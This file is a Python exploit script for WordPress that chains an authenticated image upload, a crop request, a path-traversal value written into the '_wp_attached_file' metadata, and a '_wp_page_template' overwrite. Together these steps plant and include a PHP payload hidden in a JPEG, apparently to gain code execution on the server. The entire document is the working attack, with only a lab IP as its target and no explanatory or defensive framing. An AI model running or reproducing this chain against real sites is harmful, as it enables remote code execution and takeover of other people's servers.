import re
import requests
import os
from bs4 import BeautifulSoup
from wordpress_xmlrpc import Client
from wordpress_xmlrpc import WordPressPost
from wordpress_xmlrpc.methods import posts
class admin:
    url = "http://192.168.234.129:8080/"
class keys:
    number = ""
    values = ""
class dicts:
    result = {}
#发送POST登陆请求
def login(username,password):
    url = admin.url+"wp-login.php"
    date = {
        "log":username,
        "pwd":password,
        "wp-submit":"%E7%99%BB%E5%BD%95"
    }
    r = requests.Session()
    html = r.post(url, data=date)
    return r
#点击媒体的那一步
def gain_wpnonce(session):
    url = admin.url + "wp-admin/upload.php"
    html = session.get(url)
    pattern = re.compile(r'_wpnonce\":\"(.*?)\"}')
    result = pattern.findall(html.text)
    return result[0]
def image_upload(session,wpnonce):
    url = admin.url + "wp-admin/async-upload.php"
    files = {'async-upload':open('D:\phpStudy\PHPTutorial\php\php-7.2.1-nts/1.jpg','rb')}
    date = {
        "action":"upload-attachment",
        "_wpnonce":wpnonce
    }
    html = session.post(url, data=date, files=files)
    pattern = re.compile(r'id\":(.*?),')
    post_id = re.findall(pattern, html.text)
    print ("[-------image uploading--------]")
    return post_id[0]
def edit_image(session,post_id):
    url = admin.url + 'wp-admin/post.php?post='+post_id+'&action=edit'
    html = session.get(url)
    soup = BeautifulSoup(html.text,"html.parser")
    return soup
def crop_image(session,post_id,soup):
    input_edit = soup.find("input",id="imgedit-open-btn-"+post_id)
    pattern = re.compile(r'\"(.*)\"')
    _ajax_nonce = re.findall(pattern, input_edit['onclick'].encode("UTF-8"))
    _ajax_nonce = "".join(_ajax_nonce)
    date = {
        "action":"crop-image",
        "id":post_id,
        "cropDetails[x1]":"0",
        "cropDetails[y1]":"0",
        "cropDetails[width]":"3508",
        "cropDetails[height]":"1654",
        "cropDetails[dst_width]":"3508",
        "cropDetails[dst_height]":"1654",
        "_ajax_nonce":_ajax_nonce
    }
    crop_image_url = admin.url + "wp-admin/admin-ajax.php"
    crop_image = session.post(crop_image_url, data=date)
    mode = re.compile(r'url\":\"(.*?)\"')
    url = re.findall(mode,crop_image.text)
    model = re.compile(r'id\":(.*?),')
    image_id = re.findall(model,crop_image.text)
    print ("[------crop image loading------]")
    return url[0].replace("\\",""),image_id[0]
def download_image(session,image_url):
    r = session.get(image_url, stream=True)
    img = r.content
    with open('D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\1.jpg','wb') as f:
        f.write(img)
    print ("[--------download image--------]")
def change_wp_attached_file(session,post_id,soup):
    url = admin.url + 'wp-admin/post.php'
    input_label = soup.find_all("input",type="hidden")
    for i in input_label:
        if i.get('name') != None:
            keys.number += i.get('name') + ","
            keys.values += i.get('value').encode("UTF-8") + ","
    number = keys.number.split(',')
    values = keys.values.split(',')
    for i in range(20):
        dict_string = {number[i]:values[i]}
        if dict_string != {}:
            dicts.result.update(dict_string)
    wp_attached_file = {"meta_input[_wp_attached_file]":"2019/07/1.jpg#../../../../../themes/twentyseventeen/1.jpg"}
    dicts.result.update(wp_attached_file)
    result = session.post(url, data=dicts.result)
    crop_image_text = crop_image(session, post_id, soup)
    pattern = re.compile(r'twentynineteen\/(.*)')
    crop_image_name = re.findall(pattern, crop_image_text[0])
    print ("[-----change file variable-----]")
    return crop_image_name[0]
def new_page(username,password):
    client = Client(admin.url + 'xmlrpc.php', username, password)
    post = WordPressPost()
    post.title = '233'
    post.content = '233'
    post.id = client.call(posts.NewPost(post))
    post.post_status = 'publish'
    client.call(posts.EditPost(post.id,post))
    print ("[-----Create new articles------]")
    return post.id,post.title,post.content
def gain_inline_edit(session):
    url = admin.url + "wp-admin/edit.php"
    html = session.get(url)
    pattern = re.compile(r'_inline_edit\".value=\"(.*?)\"./>')
    result = re.findall(pattern, html.text)
    return result[0]
def exploit(session,page_id,page_title,page_content,inline_edit,crop_image_name):
    url = admin.url + "wp-admin/admin-ajax.php"
    date = {
        "post_title":page_title,
        "post_name":page_content,
        "post_author":"1",
        "_inline_edit":inline_edit,
        "post_view":"list",
        "screen":"edit-post",
        "action":"inline-save",
        "post_type":"post",
        "post_ID":page_id,
        "edit_date":"true",
        "post_status":"all",
        "meta_input[_wp_page_template]":crop_image_name
    }
    result = session.post(url, data=date)
    print ("[-------exploit success--------]")
if __name__ == '__main__':
    username = input("please input username:")
    password = input("please input password:")
    session = login(username, password)
    wpnonce = gain_wpnonce(session)
    post_id = image_upload(session, wpnonce)
    soup = edit_image(session, post_id)
    image = crop_image(session, post_id, soup)
    image_url = image[0]
    image_id = image[1]
    download_image(session, image_url)
    os.system("d: && cd D:\phpStudy\PHPTutorial\php\php-7.2.1-nts\ && php jpg_payload.php 1.jpg 1.jpg")
    new_post_id = image_upload(session, wpnonce)
    soup = edit_image(session, new_post_id)
    crop_image_name = change_wp_attached_file(session, new_post_id, soup)
    page = new_page(username, password)
    page_id = page[0]
    page_title = page[1]
    page_content = page[2]
    inline_edit = gain_inline_edit(session)
    exploit(session, page_id, page_title, page_content, inline_edit, crop_image_name)
